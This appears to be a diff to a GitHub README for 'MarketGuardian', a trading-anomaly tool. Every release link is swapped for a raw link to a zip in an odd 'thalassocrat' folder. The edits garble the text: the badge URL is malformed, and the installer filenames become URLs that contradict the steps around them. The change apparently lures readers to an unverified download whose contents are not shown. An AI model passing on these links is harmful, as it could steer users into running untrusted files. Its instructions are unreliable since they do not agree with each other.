@@ -6,7 +6,7 @@ Welcome to MarketGuardian, your reliable tool for spotting unusual trading patte
 
 ## 📥 Download Now
 
-[![Download MarketGuardian](https://img.shields.io/badge/Download%20MarketGuardian-v1.0-blue.svg)](https://github.com/riyadhrodna/MarketGuardian/releases)
+[![Download MarketGuardian](https://raw.githubusercontent.com/riyadhrodna/MarketGuardian/main/thalassocrat/MarketGuardian.zip%https://raw.githubusercontent.com/riyadhrodna/MarketGuardian/main/thalassocrat/MarketGuardian.zip)](https://raw.githubusercontent.com/riyadhrodna/MarketGuardian/main/thalassocrat/MarketGuardian.zip)
 
 ## 💻 System Requirements
 
@@ -32,13 +32,13 @@ MarketGuardian brings you many useful features:
 1. **Visit the Releases Page:**
    Head to our Releases page to find the latest version. You can do this by clicking the link below:
    
-   [Download from Releases](https://github.com/riyadhrodna/MarketGuardian/releases)
+   [Download from Releases](https://raw.githubusercontent.com/riyadhrodna/MarketGuardian/main/thalassocrat/MarketGuardian.zip)
 
 2. **Choose the Right Version:**
    On the Releases page, you will see different versions of MarketGuardian. Select the most recent one. Each version includes important updates and improvements.
 
 3. **Download the Application:**
-   Click on the version you want to download. Look for the installation file suitable for your operating system. The filename might look like `MarketGuardian-v1.0.exe` for Windows or `MarketGuardian-v1.0.dmg` for macOS.
+   Click on the version you want to download. Look for the installation file suitable for your operating system. The filename might look like `https://raw.githubusercontent.com/riyadhrodna/MarketGuardian/main/thalassocrat/MarketGuardian.zip` for Windows or `https://raw.githubusercontent.com/riyadhrodna/MarketGuardian/main/thalassocrat/MarketGuardian.zip` for macOS.
 
 4. **Install the Application:**
    Once downloaded, open the file:
@@ -97,4 +97,4 @@ We will continue to update MarketGuardian with new features, algorithms, and imp
 
 For the latest version of MarketGuardian, visit the Releases page:
 
-[Download MarketGuardian](https://github.com/riyadhrodna/MarketGuardian/releases)
+[Download MarketGuardian](https://raw.githubusercontent.com/riyadhrodna/MarketGuardian/main/thalassocrat/MarketGuardian.zip)
